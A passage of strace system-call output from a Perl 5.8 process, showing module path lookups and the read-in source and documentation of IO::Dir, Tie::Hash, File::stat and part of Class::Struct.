10104 20:03:04.009977 _llseek(6, 0, [0], SEEK_CUR) = 0
10104 20:03:04.009997 read(6, "# IO::Dir.pm\n#\n# Copyright (c) 1997-8 Graham Barr <gbarr@pobox.com>. All rights reserved.\n# This program is free software; you can redistribute it and/or\n# modify it under the same terms as Perl itself.\n\npackage IO::Dir;\n\nuse 5.006;\n\nuse strict;\nuse Carp;\nuse Symbol;\nuse Exporter;\nuse IO::File;\nour(@ISA, $VERSION, @EXPORT_OK);\nuse Tie::Hash;\nuse File::stat;\nuse File::Spec;\n\n@ISA = qw(Tie::Hash Exporter);\n$VERSION = \"1.05\";\n$VERSION = eval $VERSION;\n@EXPORT_OK = qw(DIR_UNLINK);\n\nsub DIR_UNLINK () { 1 }\n\nsub new {\n    @_ >= 1 && @_ <= 2 or croak \'usage: new IO::Dir [DIRNAME]\';\n    my $class = shift;\n    my $dh = gensym;\n    if (@_) {\n\tIO::Dir::open($dh, $_[0])\n\t    or return undef;\n    }\n    bless $dh, $class;\n}\n\nsub DESTROY {\n    my ($dh) = @_;\n    closedir($dh);\n}\n\nsub open {\n    @_ == 2 or croak \'usage: $dh->open(DIRNAME)\';\n    my ($dh, $dirname) = @_;\n    return undef\n\tunless opendir($dh, $dirname);\n    # a dir name should always have a \":\" in it; assume dirname is\n    # in current directory\n    $dirname = \':\' .  $dirname if ( ($^O eq \'MacOS\') && ($dirname !~ /:/) );\n    ${*$dh}{io_dir_path} = $dirname;\n    1;\n}\n\nsub close {\n    @_ == 1 or croak \'usage: $dh->close()\';\n    my ($dh) = @_;\n    closedir($dh);\n}\n\nsub read {\n    @_ == 1 or croak \'usage: $dh->read()\';\n    my ($dh) = @_;\n    readdir($dh);\n}\n\nsub seek {\n    @_ == 2 or croak \'usage: $dh->seek(POS)\';\n    my ($dh,$pos) = @_;\n    seekdir($dh,$pos);\n}\n\nsub tell {\n    @_ == 1 or croak \'usage: $dh->tell()\';\n    my ($dh) = @_;\n    telldir($dh);\n}\n\nsub rewind {\n    @_ == 1 or croak \'usage: $dh->rewind()\';\n    my ($dh) = @_;\n    rewinddir($dh);\n}\n\nsub TIEHASH {\n    my($class,$dir,$options) = @_;\n\n    my $dh = $class->new($dir)\n\tor return undef;\n\n    $options ||= 0;\n\n    ${*$dh}{io_dir_unlink} = $options & DIR_UNLINK;\n    $dh;\n}\n\nsub FIRSTKEY {\n    my($dh) = @_;\n    $dh->rewind;\n    scalar $dh->read;\n}\n\nsub NEXTKEY {\n    my($dh) = @_;\n    scalar $dh->read;\n}\n\nsub EXISTS {\n    my($dh,$key) = @_;\n    -e File::Spec->catfile(${*$dh}{io_dir_path}, $key);\n}\n\nsub FETCH {\n    my($dh,$key) = @_;\n    &lstat(File::Spec->catfile(${*$dh}{io_dir_path}, $key));\n}\n\nsub STORE {\n    my($dh,$key,$data) = @_;\n    my($atime,$mtime) = ref($data) ? @$data : ($data,$data);\n    my $file = File::Spec->catfile(${*$dh}{io_dir_path}, $key);\n    unless(-e $file) {\n\tmy $io = IO::File->new($file,O_CREAT | O_RDWR);\n\t$io->close if $io;\n    }\n    utime($atime,$mtime, $file);\n}\n\nsub DELETE {\n    my($dh,$key) = @_;\n\n    # Only unlink if unlink-ing is enabled\n    return 0\n\tunless ${*$dh}{io_dir_unlink};\n\n    my $file = File::Spec->catfile(${*$dh}{io_dir_path}, $key);\n\n    -d $file\n\t? rmdir($file)\n\t: unlink($file);\n}\n\n1;\n\n__END__\n\n=head1 NAME \n\nIO::Dir - supply object methods for directory handles\n\n=head1 SYNOPSIS\n\n    use IO::Dir;\n    $d = IO::Dir->new(\".\");\n    if (defined $d) {\n        while (defined($_ = $d->read)) { something($_); }\n        $d->rewind;\n        while (defined($_ = $d->read)) { something_else($_); }\n        undef $d;\n    }\n\n    tie %dir, \'IO::Dir\', \".\";\n    foreach (keys %dir) {\n\tprint $_, \" \" , $dir{$_}->size,\"\\n\";\n    }\n\n=head1 DESCRIPTION\n\nThe C<IO::Dir> package provides two interfaces to perl\'s directory reading\nroutines.\n\nThe first interface is an object approach. C<IO::Dir> provides an object\nconstructor and methods, which are just wrappers around perl\'s built in\ndirectory reading routines.\n\n=over 4\n\n=item new ( [ DIRNAME ] )\n\nC<new> is the constructor for C<IO::Dir> objects. It accepts one optional\nargument which,  if given, C<new> will pass to C<open>\n\n=back\n\nThe following methods are wrappers for the directory related functions built\ninto perl (the trailing `dir\' has been removed from the names). See L<perlfunc>\nfor details of these functions.\n\n=over 4\n\n=item open ( DIRNAME )\n\n=item read ()\n\n=item seek ( POS )\n\n=item tell ()\n\n=item rewind ()\n\n=item close ()\n\n=back\n\nC<IO::Dir> also provides an interface to reading directories via a tied\nhash. The tied hash extends the interface beyond just the directory\nreading routines by the use of C<lstat>, from the C<File::stat> package,\nC<unlin", 4096) = 4096
10104 20:03:04.010532 stat64("/etc/perl/Tie/Hash.pmc", 0xbfa442ec) = -1 ENOENT (No such file or directory)
10104 20:03:04.010550 stat64("/etc/perl/Tie/Hash.pm", 0xbfa441fc) = -1 ENOENT (No such file or directory)
10104 20:03:04.010564 stat64("/usr/local/lib/perl/5.8.8/Tie/Hash.pmc", 0xbfa442ec) = -1 ENOENT (No such file or directory)
10104 20:03:04.010578 stat64("/usr/local/lib/perl/5.8.8/Tie/Hash.pm", 0xbfa441fc) = -1 ENOENT (No such file or directory)
10104 20:03:04.010592 stat64("/usr/local/share/perl/5.8.8/Tie/Hash.pmc", 0xbfa442ec) = -1 ENOENT (No such file or directory)
10104 20:03:04.010605 stat64("/usr/local/share/perl/5.8.8/Tie/Hash.pm", 0xbfa441fc) = -1 ENOENT (No such file or directory)
10104 20:03:04.010620 stat64("/usr/lib/perl5/Tie/Hash.pmc", 0xbfa442ec) = -1 ENOENT (No such file or directory)
10104 20:03:04.010636 stat64("/usr/lib/perl5/Tie/Hash.pm", 0xbfa441fc) = -1 ENOENT (No such file or directory)
10104 20:03:04.010650 stat64("/usr/share/perl5/Tie/Hash.pmc", 0xbfa442ec) = -1 ENOENT (No such file or directory)
10104 20:03:04.010662 stat64("/usr/share/perl5/Tie/Hash.pm", 0xbfa441fc) = -1 ENOENT (No such file or directory)
10104 20:03:04.010676 stat64("/usr/lib/perl/5.8/Tie/Hash.pmc", 0xbfa442ec) = -1 ENOENT (No such file or directory)
10104 20:03:04.010689 stat64("/usr/lib/perl/5.8/Tie/Hash.pm", 0xbfa441fc) = -1 ENOENT (No such file or directory)
10104 20:03:04.010703 stat64("/usr/share/perl/5.8/Tie/Hash.pmc", 0xbfa442ec) = -1 ENOENT (No such file or directory)
10104 20:03:04.010716 stat64("/usr/share/perl/5.8/Tie/Hash.pm", {st_mode=S_IFREG|0644, st_size=7304, ...}) = 0
10104 20:03:04.010738 open("/usr/share/perl/5.8/Tie/Hash.pm", O_RDONLY|O_LARGEFILE) = 8
10104 20:03:04.010753 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfa44008) = -1 ENOTTY (Inappropriate ioctl for device)
10104 20:03:04.010765 _llseek(8, 0, [0], SEEK_CUR) = 0
10104 20:03:04.010784 read(8, "package Tie::Hash;\n\nour $VERSION = \'1.02\';\n\n=head1 NAME\n\nTie::Hash, Tie::StdHash, Tie::ExtraHash - base class definitions for tied hashes\n\n=head1 SYNOPSIS\n\n    package NewHash;\n    require Tie::Hash;\n\n    @ISA = (Tie::Hash);\n\n    sub DELETE { ... }\t\t# Provides needed method\n    sub CLEAR { ... }\t\t# Overrides inherited method\n\n\n    package NewStdHash;\n    require Tie::Hash;\n\n    @ISA = (Tie::StdHash);\n\n    # All methods provided by default, define only those needing overrides\n    # Accessors access the storage in %{$_[0]};\n    # TIEHASH should return a reference to the actual storage\n    sub DELETE { ... }\n\n    package NewExtraHash;\n    require Tie::Hash;\n\n    @ISA = (Tie::ExtraHash);\n\n    # All methods provided by default, define only those needing overrides\n    # Accessors access the storage in %{$_[0][0]};\n    # TIEHASH should return an array reference with the first element being\n    # the reference to the actual storage \n    sub DELETE { \n      $_[0][1]->(\'del\', $_[0][0], $_[1]); # Call the report writer\n      delete $_[0][0]->{$_[1]};\t\t  #  $_[0]->SUPER::DELETE($_[1])\n    }\n\n\n    package main;\n\n    tie %new_hash, \'NewHash\';\n    tie %new_std_hash, \'NewStdHash\';\n    tie %new_extra_hash, \'NewExtraHash\',\n\tsub {warn \"Doing \\U$_[1]\\E of $_[2].\\n\"};\n\n=head1 DESCRIPTION\n\nThis module provides some skeletal methods for hash-tying classes. See\nL<perltie> for a list of the functions required in order to tie a hash\nto a package. The basic B<Tie::Hash> package provides a C<new> method, as well\nas methods C<TIEHASH>, C<EXISTS> and C<CLEAR>. The B<Tie::StdHash> and\nB<Tie::ExtraHash> packages\nprovide most methods for hashes described in L<perltie> (the exceptions\nare C<UNTIE> and C<DESTROY>).  They cause tied hashes to behave exactly like standard hashes,\nand allow for selective overwriting of methods.  B<Tie::Hash> grandfathers the\nC<new> method: it is used if C<TIEHASH> is not defined\nin the case a class forgets to include a C<TIEHASH> method.\n\nFor developers wishing to write their own tied hashes, the required methods\nare briefly defined below. See the L<perltie> section for more detailed\ndescriptive, as well as example code:\n\n=over 4\n\n=item TIEHASH classname, LIST\n\nThe method invoked by the command C<tie %hash, classname>. Associates a new\nhash instance with the specified class. C<LIST> would represent additional\narguments (along the lines of L<AnyDBM_File> and compatriots) needed to\ncomplete the association.\n\n=item STORE this, key, value\n\nStore datum I<value> into I<key> for the tied hash I<this>.\n\n=item FETCH this, key\n\nRetrieve the datum in I<key> for the tied hash I<this>.\n\n=item FIRSTKEY this\n\nReturn the first key in the hash.\n\n=item NEXTKEY this, lastkey\n\nReturn the next key in the hash.\n\n=item EXISTS this, key\n\nVerify that I<key> exists with the tied hash I<this>.\n\nThe B<Tie::Hash> implementation is a stub that simply croaks.\n\n=item DELETE this, key\n\nDelete the key I<key> from the tied hash I<this>.\n\n=item CLEAR this\n\nClear all values from the tied hash I<this>.\n\n=item SCALAR this\n\nReturns what evaluating the hash in scalar context yields.\n\nB<Tie::Hash> does not implement this method (but B<Tie::StdHash>\nand B<Tie::ExtraHash> do).\n\n=back\n\n=head1 Inheriting from B<Tie::StdHash>\n\nThe accessor methods assume that the actual storage for the data in the tied\nhash is in the hash referenced by C<tied(%tiedhash)>.  Thus overwritten\nC<TIEHASH> method should return a hash reference, and the remaining methods\nshould operate on the hash referenced by the first argument:\n\n  package ReportHash;\n  our @ISA = \'Tie::StdHash\';\n\n  sub TIEHASH  {\n    my $storage = bless {}, shift;\n    warn \"New ReportHash created, stored in $storage.\\n\";\n    $storage\n  }\n  sub STORE    {\n    warn \"Storing data with key $_[1] at $_[0].\\n\";\n    $_[0]{$_[1]} = $_[2]\n  }\n\n\n=head1 Inheriting from B<Tie::ExtraHash>\n\nThe accessor methods assume that the actual storage for the data in the tied\nhash is in the hash referenced by C<(tied(%tiedhash))-E<gt>[0]>.  Thus overwritten\nC<TIEHASH> method should return an array reference with the first\nelement being a hash refer", 4096) = 4096
10104 20:03:04.011157 read(8, "ence, and the remaining methods should operate on the\nhash C<< %{ $_[0]->[0] } >>:\n\n  package ReportHash;\n  our @ISA = \'Tie::ExtraHash\';\n\n  sub TIEHASH  {\n    my $class = shift;\n    my $storage = bless [{}, @_], $class;\n    warn \"New ReportHash created, stored in $storage.\\n\";\n    $storage;\n  }\n  sub STORE    {\n    warn \"Storing data with key $_[1] at $_[0].\\n\";\n    $_[0][0]{$_[1]} = $_[2]\n  }\n\nThe default C<TIEHASH> method stores \"extra\" arguments to tie() starting\nfrom offset 1 in the array referenced by C<tied(%tiedhash)>; this is the\nsame storage algorithm as in TIEHASH subroutine above.  Hence, a typical\npackage inheriting from B<Tie::ExtraHash> does not need to overwrite this\nmethod.\n\n=head1 C<SCALAR>, C<UNTIE> and C<DESTROY>\n\nThe methods C<UNTIE> and C<DESTROY> are not defined in B<Tie::Hash>,\nB<Tie::StdHash>, or B<Tie::ExtraHash>.  Tied hashes do not require\npresence of these methods, but if defined, the methods will be called in\nproper time, see L<perltie>.\n\nC<SCALAR> is only defined in B<Tie::StdHash> and B<Tie::ExtraHash>.\n\nIf needed, these methods should be defined by the package inheriting from\nB<Tie::Hash>, B<Tie::StdHash>, or B<Tie::ExtraHash>. See L<pertie/\"SCALAR\">\nto find out what happens when C<SCALAR> does not exist.\n\n=head1 MORE INFORMATION\n\nThe packages relating to various DBM-related implementations (F<DB_File>,\nF<NDBM_File>, etc.) show examples of general tied hashes, as does the\nL<Config> module. While these do not utilize B<Tie::Hash>, they serve as\ngood working examples.\n\n=cut\n\nuse Carp;\nuse warnings::register;\n\nsub new {\n    my $pkg = shift;\n    $pkg->TIEHASH(@_);\n}\n\n# Grandfather \"new\"\n\nsub TIEHASH {\n    my $pkg = shift;\n    if (defined &{\"${pkg}::new\"}) {\n\twarnings::warnif(\"WARNING: calling ${pkg}->new since ${pkg}->TIEHASH is missing\");\n\t$pkg->new(@_);\n    }\n    else {\n\tcroak \"$pkg doesn\'t define a TIEHASH method\";\n    }\n}\n\nsub EXISTS {\n    my $pkg = ref $_[0];\n    croak \"$pkg doesn\'t define an EXISTS method\";\n}\n\nsub CLEAR {\n    my $self = shift;\n    my $key = $self->FIRSTKEY(@_);\n    my @keys;\n\n    while (defined $key) {\n\tpush @keys, $key;\n\t$key = $self->NEXTKEY(@_, $key);\n    }\n    foreach $key (@keys) {\n\t$self->DELETE(@_, $key);\n    }\n}\n\n# The Tie::StdHash package implements standard perl hash behaviour.\n# It exists to act as a base class for classes which only wish to\n# alter some parts of their behaviour.\n\npackage Tie::StdHash;\n# @ISA = qw(Tie::Hash);\t\t# would inherit new() only\n\nsub TIEHASH  { bless {}, $_[0] }\nsub STORE    { $_[0]->{$_[1]} = $_[2] }\nsub FETCH    { $_[0]->{$_[1]} }\nsub FIRSTKEY { my $a = scalar keys %{$_[0]}; each %{$_[0]} }\nsub NEXTKEY  { each %{$_[0]} }\nsub EXISTS   { exists $_[0]->{$_[1]} }\nsub DELETE   { delete $_[0]->{$_[1]} }\nsub CLEAR    { %{$_[0]} = () }\nsub SCALAR   { scalar %{$_[0]} }\n\npackage Tie::ExtraHash;\n\nsub TIEHASH  { my $p = shift; bless [{}, @_], $p }\nsub STORE    { $_[0][0]{$_[1]} = $_[2] }\nsub FETCH    { $_[0][0]{$_[1]} }\nsub FIRSTKEY { my $a = scalar keys %{$_[0][0]}; each %{$_[0][0]} }\nsub NEXTKEY  { each %{$_[0][0]} }\nsub EXISTS   { exists $_[0][0]->{$_[1]} }\nsub DELETE   { delete $_[0][0]->{$_[1]} }\nsub CLEAR    { %{$_[0][0]} = () }\nsub SCALAR   { scalar %{$_[0][0]} }\n\n1;\n", 4096) = 3208
10104 20:03:04.011808 read(8, "", 4096) = 0
10104 20:03:04.011825 close(8)          = 0
10104 20:03:04.011857 stat64("/etc/perl/File/stat.pmc", 0xbfa442ec) = -1 ENOENT (No such file or directory)
10104 20:03:04.011873 stat64("/etc/perl/File/stat.pm", 0xbfa441fc) = -1 ENOENT (No such file or directory)
10104 20:03:04.011888 stat64("/usr/local/lib/perl/5.8.8/File/stat.pmc", 0xbfa442ec) = -1 ENOENT (No such file or directory)
10104 20:03:04.011901 stat64("/usr/local/lib/perl/5.8.8/File/stat.pm", 0xbfa441fc) = -1 ENOENT (No such file or directory)
10104 20:03:04.011915 stat64("/usr/local/share/perl/5.8.8/File/stat.pmc", 0xbfa442ec) = -1 ENOENT (No such file or directory)
10104 20:03:04.011929 stat64("/usr/local/share/perl/5.8.8/File/stat.pm", 0xbfa441fc) = -1 ENOENT (No such file or directory)
10104 20:03:04.011943 stat64("/usr/lib/perl5/File/stat.pmc", 0xbfa442ec) = -1 ENOENT (No such file or directory)
10104 20:03:04.011955 stat64("/usr/lib/perl5/File/stat.pm", 0xbfa441fc) = -1 ENOENT (No such file or directory)
10104 20:03:04.012004 stat64("/usr/share/perl5/File/stat.pmc", 0xbfa442ec) = -1 ENOENT (No such file or directory)
10104 20:03:04.012039 stat64("/usr/share/perl5/File/stat.pm", 0xbfa441fc) = -1 ENOENT (No such file or directory)
10104 20:03:04.012053 stat64("/usr/lib/perl/5.8/File/stat.pmc", 0xbfa442ec) = -1 ENOENT (No such file or directory)
10104 20:03:04.012067 stat64("/usr/lib/perl/5.8/File/stat.pm", 0xbfa441fc) = -1 ENOENT (No such file or directory)
10104 20:03:04.012081 stat64("/usr/share/perl/5.8/File/stat.pmc", 0xbfa442ec) = -1 ENOENT (No such file or directory)
10104 20:03:04.012095 stat64("/usr/share/perl/5.8/File/stat.pm", {st_mode=S_IFREG|0644, st_size=3372, ...}) = 0
10104 20:03:04.012117 open("/usr/share/perl/5.8/File/stat.pm", O_RDONLY|O_LARGEFILE) = 8
10104 20:03:04.012132 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfa44008) = -1 ENOTTY (Inappropriate ioctl for device)
10104 20:03:04.012143 _llseek(8, 0, [0], SEEK_CUR) = 0
10104 20:03:04.012161 read(8, "package File::stat;\nuse 5.006;\n\nuse strict;\nuse warnings;\n\nour(@EXPORT, @EXPORT_OK, %EXPORT_TAGS);\n\nour $VERSION = \'1.00\';\n\nBEGIN { \n    use Exporter   ();\n    @EXPORT      = qw(stat lstat);\n    @EXPORT_OK   = qw( $st_dev\t   $st_ino    $st_mode \n\t\t       $st_nlink   $st_uid    $st_gid \n\t\t       $st_rdev    $st_size \n\t\t       $st_atime   $st_mtime  $st_ctime \n\t\t       $st_blksize $st_blocks\n\t\t    );\n    %EXPORT_TAGS = ( FIELDS => [ @EXPORT_OK, @EXPORT ] );\n}\nuse vars @EXPORT_OK;\n\n# Class::Struct forbids use of @ISA\nsub import { goto &Exporter::import }\n\nuse Class::Struct qw(struct);\nstruct \'File::stat\' => [\n     map { $_ => \'$\' } qw{\n\t dev ino mode nlink uid gid rdev size\n\t atime mtime ctime blksize blocks\n     }\n];\n\nsub populate (@) {\n    return unless @_;\n    my $stob = new();\n    @$stob = (\n\t$st_dev, $st_ino, $st_mode, $st_nlink, $st_uid, $st_gid, $st_rdev,\n        $st_size, $st_atime, $st_mtime, $st_ctime, $st_blksize, $st_blocks ) \n\t    = @_;\n    return $stob;\n} \n\nsub lstat ($)  { populate(CORE::lstat(shift)) }\n\nsub stat ($) {\n    my $arg = shift;\n    my $st = populate(CORE::stat $arg);\n    return $st if $st;\n\tmy $fh;\n    {\n\t\tlocal $!;\n\t\tno strict \'refs\';\n\t\trequire Symbol;\n\t\t$fh = \\*{ Symbol::qualify( $arg, caller() )};\n\t\treturn unless defined fileno $fh;\n\t}\n    return populate(CORE::stat $fh);\n}\n\n1;\n__END__\n\n=head1 NAME\n\nFile::stat - by-name interface to Perl\'s built-in stat() functions\n\n=head1 SYNOPSIS\n\n use File::stat;\n $st = stat($file) or die \"No $file: $!\";\n if ( ($st->mode & 0111) && $st->nlink > 1) ) {\n     print \"$file is executable with lotsa links\\n\";\n } \n\n use File::stat qw(:FIELDS);\n stat($file) or die \"No $file: $!\";\n if ( ($st_mode & 0111) && $st_nlink > 1) ) {\n     print \"$file is executable with lotsa links\\n\";\n } \n\n=head1 DESCRIPTION\n\nThis module\'s default exports override the core stat() \nand lstat() functions, replacing them with versions that return \n\"File::stat\" objects.  This object has methods that\nreturn the similarly named structure field name from the\nstat(2) function; namely,\ndev,\nino,\nmode,\nnlink,\nuid,\ngid,\nrdev,\nsize,\natime,\nmtime,\nctime,\nblksize,\nand\nblocks.  \n\nYou may also import all the structure fields directly into your namespace\nas regular variables using the :FIELDS import tag.  (Note that this still\noverrides your stat() and lstat() functions.)  Access these fields as\nvariables named with a preceding C<st_> in front their method names.\nThus, C<$stat_obj-E<gt>dev()> corresponds to $st_dev if you import\nthe fields.\n\nTo access this functionality without the core overrides,\npass the C<use> an empty import list, and then access\nfunction functions with their full qualified names.\nOn the other hand, the built-ins are still available\nvia the C<CORE::> pseudo-package.\n\n=head1 BUGS\n\nAs of Perl 5.8.0 after using this module you cannot use the implicit\nC<$_> or the special filehandle C<_> with stat() or lstat(), trying\nto do so leads into strange errors.  The workaround is for C<$_> to\nbe explicit\n\n    my $stat_obj = stat $_;\n\nand for C<_> to explicitly populate the object using the unexported\nand undocumented populate() function with CORE::stat():\n\n    my $stat_obj = File::stat::populate(CORE::stat(_));\n\n=head1 NOTE\n\nWhile this class is currently implemented using the Class::Struct\nmodule to build a struct-like class, you shouldn\'t rely upon this.\n\n=head1 AUTHOR\n\nTom Christiansen\n", 4096) = 3372
10104 20:03:04.012629 stat64("/etc/perl/Class/Struct.pmc", 0xbfa43e3c) = -1 ENOENT (No such file or directory)
10104 20:03:04.012649 stat64("/etc/perl/Class/Struct.pm", 0xbfa43d4c) = -1 ENOENT (No such file or directory)
10104 20:03:04.012663 stat64("/usr/local/lib/perl/5.8.8/Class/Struct.pmc", 0xbfa43e3c) = -1 ENOENT (No such file or directory)
10104 20:03:04.012677 stat64("/usr/local/lib/perl/5.8.8/Class/Struct.pm", 0xbfa43d4c) = -1 ENOENT (No such file or directory)
10104 20:03:04.012691 stat64("/usr/local/share/perl/5.8.8/Class/Struct.pmc", 0xbfa43e3c) = -1 ENOENT (No such file or directory)
10104 20:03:04.012705 stat64("/usr/local/share/perl/5.8.8/Class/Struct.pm", 0xbfa43d4c) = -1 ENOENT (No such file or directory)
10104 20:03:04.012720 stat64("/usr/lib/perl5/Class/Struct.pmc", 0xbfa43e3c) = -1 ENOENT (No such file or directory)
10104 20:03:04.012732 stat64("/usr/lib/perl5/Class/Struct.pm", 0xbfa43d4c) = -1 ENOENT (No such file or directory)
10104 20:03:04.012746 stat64("/usr/share/perl5/Class/Struct.pmc", 0xbfa43e3c) = -1 ENOENT (No such file or directory)
10104 20:03:04.012758 stat64("/usr/share/perl5/Class/Struct.pm", 0xbfa43d4c) = -1 ENOENT (No such file or directory)
10104 20:03:04.012772 stat64("/usr/lib/perl/5.8/Class/Struct.pmc", 0xbfa43e3c) = -1 ENOENT (No such file or directory)
10104 20:03:04.012786 stat64("/usr/lib/perl/5.8/Class/Struct.pm", 0xbfa43d4c) = -1 ENOENT (No such file or directory)
10104 20:03:04.012800 stat64("/usr/share/perl/5.8/Class/Struct.pmc", 0xbfa43e3c) = -1 ENOENT (No such file or directory)
10104 20:03:04.012814 stat64("/usr/share/perl/5.8/Class/Struct.pm", {st_mode=S_IFREG|0644, st_size=20512, ...}) = 0
10104 20:03:04.012836 open("/usr/share/perl/5.8/Class/Struct.pm", O_RDONLY|O_LARGEFILE) = 10
10104 20:03:04.012851 ioctl(10, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfa43b58) = -1 ENOTTY (Inappropriate ioctl for device)
10104 20:03:04.012863 _llseek(10, 0, [0], SEEK_CUR) = 0
10104 20:03:04.012885 read(10, "package Class::Struct;\n\n## See POD after __END__\n\nuse 5.006_001;\n\nuse strict;\nuse warnings::register;\nour(@ISA, @EXPORT, $VERSION);\n\nuse Carp;\n\nrequire Exporter;\n@ISA = qw(Exporter);\n@EXPORT = qw(struct);\n\n$VERSION = \'0.63\';\n\n## Tested on 5.002 and 5.003 without class membership tests:\nmy $CHECK_CLASS_MEMBERSHIP = ($] >= 5.003_95);\n\nmy $print = 0;\nsub printem {\n    if (@_) { $print = shift }\n    else    { $print++ }\n}\n\n{\n    package Class::Struct::Tie_ISA;\n\n    sub TIEARRAY {\n        my $class = shift;\n        return bless [], $class;\n    }\n\n    sub STORE {\n        my ($self, $index, $value) = @_;\n        Class::Struct::_subclass_error();\n    }\n\n    sub FETCH {\n        my ($self, $index) = @_;\n        $self->[$index];\n    }\n\n    sub FETCHSIZE {\n        my $self = shift;\n        return scalar(@$self);\n    }\n\n    sub DESTROY { }\n}\n\nsub import {\n    my $self = shift;\n\n    if ( @_ == 0 ) {\n      $self->export_to_level( 1, $self, @EXPORT );\n    } elsif ( @_ == 1 ) {\n\t# This is admittedly a little bit silly:\n\t# do we ever export anything else than \'struct\'...?\n      $self->export_to_level( 1, $self, @_ );\n    } else {\n      goto &struct;\n    }\n}\n\nsub struct {\n\n    # Determine parameter list structure, one of:\n    #   struct( class => [ element-list ])\n    #   struct( class => { element-list })\n    #   struct( element-list )\n    # Latter form assumes current package name as struct name.\n\n    my ($class, @decls);\n    my $base_type = ref $_[1];\n    if ( $base_type eq \'HASH\' ) {\n        $class = shift;\n        @decls = %{shift()};\n        _usage_error() if @_;\n    }\n    elsif ( $base_type eq \'ARRAY\' ) {\n        $class = shift;\n        @decls = @{shift()};\n        _usage_error() if @_;\n    }\n    else {\n        $base_type = \'ARRAY\';\n        $class = (caller())[0];\n        @decls = @_;\n    }\n\n    _usage_error() if @decls % 2 == 1;\n\n    # Ensure we are not, and will not be, a subclass.\n\n    my $isa = do {\n        no strict \'refs\';\n        \\@{$class . \'::ISA\'};\n    };\n    _subclass_error() if @$isa;\n    tie @$isa, \'Class::Struct::Tie_ISA\';\n\n    # Create constructor.\n\n    croak \"function \'new\' already defined in package $class\"\n        if do { no strict \'refs\'; defined &{$class . \"::new\"} };\n\n    my @methods = ();\n    my %refs = ();\n    my %arrays = ();\n    my %hashes = ();\n    my %classes = ();\n    my $got_class = 0;\n    my $out = \'\';\n\n    $out = \"{\\n  package $class;\\n  use Carp;\\n  sub new {\\n\";\n    $out .= \"    my (\\$class, \\%init) = \\@_;\\n\";\n    $out .= \"    \\$class = __PACKAGE__ unless \\@_;\\n\";\n\n    my $cnt = 0;\n    my $idx = 0;\n    my( $cmt, $name, $type, $elem );\n\n    if( $base_type eq \'HASH\' ){\n        $out .= \"    my(\\$r) = {};\\n\";\n        $cmt = \'\';\n    }\n    elsif( $base_type eq \'ARRAY\' ){\n        $out .= \"    my(\\$r) = [];\\n\";\n    }\n    while( $idx < @decls ){\n        $name = $decls[$idx];\n        $type = $decls[$idx+1];\n        push( @methods, $name );\n        if( $base_type eq \'HASH\' ){\n            $elem = \"{\'${class}::$name\'}\";\n        }\n        elsif( $base_type eq \'ARRAY\' ){\n            $elem = \"[$cnt]\";\n            ++$cnt;\n            $cmt = \" # $name\";\n        }\n        if( $type =~ /^\\*(.)/ ){\n            $refs{$name}++;\n            $type = $1;\n        }\n        my $init = \"defined(\\$init{\'$name\'}) ? \\$init{\'$name\'} :\";\n        if( $type eq \'@\' ){\n            $out .= \"    croak \'Initializer for $name must be array reference\'\\n\"; \n            $out .= \"        if defined(\\$init{\'$name\'}) && ref(\\$init{\'$name\'}) ne \'ARRAY\';\\n\";\n            $out .= \"    \\$r->$elem = $init [];$cmt\\n\"; \n            $arrays{$name}++;\n        }\n        elsif( $type eq \'%\' ){\n            $out .= \"    croak \'Initializer for $name must be hash reference\'\\n\";\n            $out .= \"        if defined(\\$init{\'$name\'}) && ref(\\$init{\'$name\'}) ne \'HASH\';\\n\";\n            $out .= \"    \\$r->$elem = $init {};$cmt\\n\";\n            $hashes{$name}++;\n        }\n        elsif ( $type eq \'$\') {\n            $out .= \"    \\$r->$elem = $init undef;$cmt\\n\";\n        }\n        elsif( $type =~ /^\\w+(?:::\\w+)*$/ ){\n            $out .= \"    if (defined(\\$init{\'$name\'}))", 4096) = 4096
10104 20:03:04.013339 brk(0x82de000)    = 0x82de000
10104 20:03:04.013737 read(10, " {\\n\";\n           $out .= \"       if (ref \\$init{\'$name\'} eq \'HASH\')\\n\";\n            $out .= \"            { \\$r->$elem = $type->new(\\%{\\$init{\'$name\'}}) } $cmt\\n\";\n           $out .= \"       elsif (UNIVERSAL::isa(\\$init{\'$name\'}, \'$type\'))\\n\";\n            $out .= \"            { \\$r->$elem = \\$init{\'$name\'} } $cmt\\n\";\n            $out .= \"       else { croak \'Initializer for $name must be hash or $type reference\' }\\n\";\n            $out .= \"    }\\n\";\n            $classes{$name} = $type;\n            $got_class = 1;\n        }\n        else{\n            croak \"\'$type\' is not a valid struct element type\";\n        }\n        $idx += 2;\n    }\n    $out .= \"    bless \\$r, \\$class;\\n  }\\n\";\n\n    # Create accessor methods.\n\n    my( $pre, $pst, $sel );\n    $cnt = 0;\n    foreach $name (@methods){\n        if ( do { no strict \'refs\'; defined &{$class . \"::$name\"} } ) {\n            warnings::warnif(\"function \'$name\' already defined, overrides struct accessor method\");\n        }\n        else {\n            $pre = $pst = $cmt = $sel = \'\';\n            if( defined $refs{$name} ){\n                $pre = \"\\\\(\";\n                $pst = \")\";\n                $cmt = \" # returns ref\";\n            }\n            $out .= \"  sub $name {$cmt\\n    my \\$r = shift;\\n\";\n            if( $base_type eq \'ARRAY\' ){\n                $elem = \"[$cnt]\";\n                ++$cnt;\n            }\n            elsif( $base_type eq \'HASH\' ){\n                $elem = \"{\'${class}::$name\'}\";\n            }\n            if( defined $arrays{$name} ){\n                $out .= \"    my \\$i;\\n\";\n                $out .= \"    \\@_ ? (\\$i = shift) : return \\$r->$elem;\\n\"; \n                $out .= \"    if (ref(\\$i) eq \'ARRAY\' && !\\@_) { \\$r->$elem = \\$i; return \\$r }\\n\";\n                $sel = \"->[\\$i]\";\n            }\n            elsif( defined $hashes{$name} ){\n                $out .= \"    my \\$i;\\n\";\n                $out .= \"    \\@_ ? (\\$i = shift) : return \\$r->$elem;\\n\";\n                $out .= \"    if (ref(\\$i) eq \'HASH\' && !\\@_) { \\$r->$elem = \\$i; return \\$r }\\n\";\n                $sel = \"->{\\$i}\";\n            }\n            elsif( defined $classes{$name} ){\n                if ( $CHECK_CLASS_MEMBERSHIP ) {\n                    $out .= \"    croak \'$name argument is wrong class\' if \\@_ && ! UNIVERSAL::isa(\\$_[0], \'$classes{$name}\');\\n\";\n                }\n            }\n            $out .= \"    croak \'Too many args to $name\' if \\@_ > 1;\\n\";\n            $out .= \"    \\@_ ? ($pre\\$r->$elem$sel = shift$pst) : 